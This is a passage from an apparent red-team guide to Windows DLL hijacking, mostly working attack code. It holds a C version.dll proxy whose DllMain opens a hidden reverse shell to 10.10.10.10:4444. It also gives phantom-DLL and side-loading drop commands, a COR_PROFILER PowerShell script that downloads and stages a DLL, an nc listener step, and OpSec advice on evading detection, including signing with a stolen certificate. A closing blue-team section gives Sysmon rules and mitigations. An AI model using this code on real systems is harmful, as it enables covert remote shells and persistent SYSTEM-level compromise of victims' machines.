#pragma comment(linker, "/export:VerFindFileW=C:\\Windows\\System32\\version.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=C:\\Windows\\System32\\version.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=C:\\Windows\\System32\\version.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerLanguageNameA=C:\\Windows\\System32\\version.VerLanguageNameA,@14")
#pragma comment(linker, "/export:VerLanguageNameW=C:\\Windows\\System32\\version.VerLanguageNameW,@15")
#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.VerQueryValueW,@17")

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define LHOST "10.10.10.10"
#define LPORT  4444

static DWORD WINAPI shell_thread(LPVOID p) {
    (void)p;
    Sleep(800);

    WSADATA wsa = {0};
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                             NULL, 0, WSA_FLAG_OVERLAPPED);

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    int r = 5;
    while (r-- > 0) {
        if (connect(sock, (SOCKADDR*)&sa, sizeof(sa)) == 0) break;
        Sleep(2000);
    }
    if (r < 0) { closesocket(sock); WSACleanup(); return 1; }

    STARTUPINFOA si      = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = (HANDLE)sock;
    si.hStdOutput  = (HANDLE)sock;
    si.hStdError   = (HANDLE)sock;

    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(NULL, 0, shell_thread, NULL, 0, NULL);
    }
    return TRUE;
}
```

---

## Phase 4 — High-Value Targets

### Target 1: IKEEXT service — wlbsctrl.dll

`wlbsctrl.dll` doesn't exist on default Windows installs. The IKEEXT (IKE and AuthIP IPsec Keying Modules) service tries to load it and fails silently. Drop your DLL at the right path, restart IKEEXT (or wait for a trigger), and it loads in a SYSTEM context.

```cmd
:: drop phantom DLL — no forwarding needed, real DLL doesn't exist
copy hijack_base.dll C:\Windows\System32\wlbsctrl.dll

:: trigger (requires restart or the service to recycle — can also wait)
:: if you have SeManageVolume or similar: sc stop IKEEXT && sc start IKEEXT
```

> **Context:** SYSTEM. **Trigger:** Service restart or network authentication event. **Persistence:** Survives reboots. The service loads the DLL on every start.

---

### Target 2: version.dll side-loading

`version.dll` is one of the most universally loaded DLLs. Nearly every GUI application imports it for version checking. Many applications in `C:\Program Files\` load it from their own directory first (before System32), making any writable app directory a viable drop point.

```powershell {linenos=inline}
# find applications that load version.dll from their own dir
# (i.e., they have a local version.dll OR their dir is writable)
Get-ChildItem "$env:PROGRAMFILES" -Recurse -Filter "version.dll" -ErrorAction SilentlyContinue |
    ForEach-Object {
        $dir = $_.DirectoryName
        $probe = Join-Path $dir "probe_test.tmp"
        try {
            [IO.File]::WriteAllBytes($probe, @(0))
            Remove-Item $probe -Force
            Write-Host "[WRITABLE] $dir" -ForegroundColor Yellow
        } catch {}
    }
```

```cmd
:: compile version proxy
x86_64-w64-mingw32-gcc -shared -o version.dll version_proxy.c ^
    -lws2_32 -mwindows -s -fno-ident -Wl,--build-id=none

:: drop in vulnerable app directory
copy version.dll "C:\Program Files\VulnerableApp\version.dll"

:: trigger: launch the app (or it may already be running as a service)
```

---

### Target 3: COR_PROFILER — .NET profiler hijack

The .NET CLR loads a profiler DLL specified by the `COR_PROFILER_PATH` environment variable whenever a .NET application starts. This is a legitimate debugging feature and a reliable user-level DLL load primitive that doesn't require finding a specific vulnerable application.

```powershell {linenos=inline}
# COR_PROFILER_Hijack.ps1
# Sets user-level env vars so any .NET process this user launches
# loads our profiler DLL.
# No admin required. Survives logoff (registry-persisted).

param(
    [string]$DllPath = "C:\Windows\Tasks\CLRProfiler.dll",
    [string]$DllUrl  = "http://10.10.10.10/hijack_base.dll"
)

# fetch and stage the DLL to a trusted writable path
(New-Object Net.WebClient).DownloadFile($DllUrl, $DllPath)
Write-Host "[+] DLL staged: $DllPath"

# generate a unique CLSID (doesn't need to be registered)
$clsid = [System.Guid]::NewGuid().ToString("B").ToUpper()

# set environment variables — affect all child .NET processes
[Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", "1",         "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER",          $clsid,     "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER_PATH",     $DllPath,   "User")

# also set for current session
$env:COR_ENABLE_PROFILING = "1"
$env:COR_PROFILER          = $clsid
$env:COR_PROFILER_PATH     = $DllPath

Write-Host "[+] COR_PROFILER hijack armed"
Write-Host "[*] CLSID : $clsid"
Write-Host "[*] DLL   : $DllPath"
Write-Host "[*] trigger: launch any .NET application (PowerShell, msbuild, etc.)"
Write-Host ""
Write-Host "[*] cleanup: run Remove-CORProfiler.ps1 after engagement"
```

```powershell
# Remove-CORProfiler.ps1 — cleanup
[Environment]::SetEnvironmentVariable("COR_ENABLE_PROFILING", $null, "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER",          $null, "User")
[Environment]::SetEnvironmentVariable("COR_PROFILER_PATH",     $null, "User")
Write-Host "[+] COR_PROFILER environment variables removed"
```

The profiler DLL must export `DllGetClassObject` to satisfy the CLR loader. Add this stub to `hijack_base.c`:

```c
/* add to hijack_base.c when using as COR_PROFILER payload */
#include <objbase.h>

__declspec(dllexport)
HRESULT STDAPICALLTYPE DllGetClassObject(REFCLSID rclsid,
                                          REFIID riid,
                                          LPVOID *ppv) {
    /* return failure — CLR will continue loading, payload already fired in DllMain */
    return CLASS_E_CLASSNOTAVAILABLE;
}
```

---

## Full Engagement Workflow

``` {linenos=inline}
1.  Run Find-PhantomDLLs.ps1
       → identifies confirmed phantom targets on this machine

2.  Run Find-HijackableApps.ps1 -CheckImports
       → finds signed applications in trusted paths with writable directories
       → lists DLLs each app imports (candidates for side-loading)

3.  Choose strategy:
       Phantom DLL?   → compile hijack_base.c, drop as the missing DLL
       Side-load?     → run dll_proxy_gen.py against the real DLL,
                        compile proxy, drop with real DLL renamed
       No file drop?  → use COR_PROFILER technique (env var only)

4.  Stage payload:
       copy <payload>.dll <writable trusted path or app dir>\<target>.dll

5.  Trigger:
       Service hijack:  wait for service recycle / reboot
       App side-load:   launch the application
       COR_PROFILER:    launch any .NET process

6.  Catch shell on listener:
       nc -lvnp 4444
```

---

## Persistence

DLL hijacking is naturally persistent: the malicious DLL loads every time the host process starts. For service-based targets this means every boot. No registry run keys, no scheduled tasks, no new processes that defenders can spot at startup.

```powershell {linenos=inline}
# Verify-Persistence.ps1 — confirm the hijack DLL will survive reboot
param([string]$DllPath)

if (-not (Test-Path $DllPath)) {
    Write-Host "[-] DLL not found at $DllPath" -ForegroundColor Red
    return
}

$sig = Get-AuthenticodeSignature $DllPath
Write-Host "[*] Path    : $DllPath"
Write-Host "[*] Signed  : $($sig.Status)"
Write-Host "[*] Exists  : True"

# check if path is in a location that persists across user sessions
$persistent = $DllPath -match "System32|SysWOW64|Program Files|Windows\\Tasks"
Write-Host "[*] Survives logoff: $persistent"

# check if any service is configured to load from this directory
$dir = Split-Path $DllPath
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -like "$dir\*"
} | ForEach-Object {
    Write-Host "[+] Service trigger: $($_.Name) ($($_.StartMode))" -ForegroundColor Green
}
```

---

## OpSec Notes

- **DLL name** — use the exact name the target expects. A DLL named `wlbsctrl.dll` in System32 is invisible to the untrained eye. A DLL named `payload.dll` is not.
- **Forwarding** — always proxy when replacing a real DLL. A host application that crashes immediately after loading your DLL is a guaranteed incident ticket.
- **Thread timing** — the `Sleep(800)` in `DllMain` is important. Connecting out before the host process finishes initialization can cause loading failures or deadlocks. For service DLLs, increase this to 2000–5000ms.
- **Architecture** — match the bitness of your DLL to the host process. A 64-bit process will not load a 32-bit DLL. `Find-HijackableApps.ps1` reports the binary architecture via PE header parsing — check before compiling.
- **Signing** — unsigned DLLs loaded by signed applications generate Sysmon EID 7 events with `Signed: false`. Self-signing with a purchased or stolen certificate changes the hash and suppresses the unsigned flag.
- **COR_PROFILER** is one of the quietest techniques: no file in a suspicious path, no new service, triggers only when .NET processes launch. Clean up environment variables immediately after your shell is stable.

---

## Detection (Blue Team)

| signal | event |
|--------|-------|
| Unsigned DLL loaded by signed process | Sysmon EID 7 — `Signed: false`, `SignatureStatus != Valid` |
| DLL loaded from non-standard path | Sysmon EID 7 — `ImageLoaded` path outside System32 |
| New DLL written to application directory | Sysmon EID 11 — FileCreate in Program Files |
| `COR_ENABLE_PROFILING` set in user registry | Sysmon EID 13 — Registry value set |
| Process loading DLL from `%TEMP%` or writable trusted path | Sysmon EID 7 — ImageLoaded path analysis |
| Service process spawning unexpected child | Sysmon EID 1 — ParentImage is a service host |

**Sysmon rules:**

```xml {linenos=inline}
<!-- unsigned DLL loaded by trusted process -->
<ImageLoad onmatch="include">
  <Signed condition="is">false</Signed>
</ImageLoad>

<!-- DLL loaded from user-writable trusted paths -->
<ImageLoad onmatch="include">
  <ImageLoaded condition="contains">Windows\Tasks\</ImageLoaded>
  <ImageLoaded condition="contains">Windows\Temp\</ImageLoaded>
  <ImageLoaded condition="contains">Windows\tracing\</ImageLoaded>
  <ImageLoaded condition="contains">spool\drivers\color\</ImageLoaded>
</ImageLoad>

<!-- COR_PROFILER registry changes -->
<RegistryEvent onmatch="include">
  <TargetObject condition="contains">COR_ENABLE_PROFILING</TargetObject>
  <TargetObject condition="contains">COR_PROFILER</TargetObject>
</RegistryEvent>
```

**Mitigation:** Enable AppLocker DLL Rules (accept the performance cost — it's worth it). Combine with WDAC publisher rules that require DLLs to be signed by a trusted publisher. For COR_PROFILER: monitor registry changes to `HKCU\Environment` for profiler-related keys and block via GPO (`Computer Configuration → Windows Settings → Security Settings → Software Restriction Policies`).

---

## MITRE ATT&CK

| technique | ID | description |
|-----------|----|-------------|
| DLL Search Order Hijacking | T1574.001 | Placing malicious DLL earlier in search order |
| DLL Side-Loading | T1574.002 | Dropping DLL alongside legitimate signed binary |
| COR_PROFILER | T1574.012 | Abusing .NET profiler environment variable |
| Hijack Execution Flow | T1574 | Parent technique covering all DLL hijacking |
| Defense Evasion | TA0005 | Primary tactic |
| Persistence | TA0003 | Service/application DLL hijacks survive reboots |

---

## References

- [MITRE ATT&CK T1574.001 — DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
- [MITRE ATT&CK T1574.002 — DLL Side-Loading](https://attack.mitre.org/techniques/T1574/002/)
- [MITRE ATT&CK T1574.012 — COR_PROFILER](https://attack.mitre.org/techniques/T1574/012/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- Oddvar Moe — phantom DLL research
- [Wietze Beukema — hijacklibs.net](https://hijacklibs.net/)
- [api0cradle — UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList)
- itm4n — COR_PROFILER research
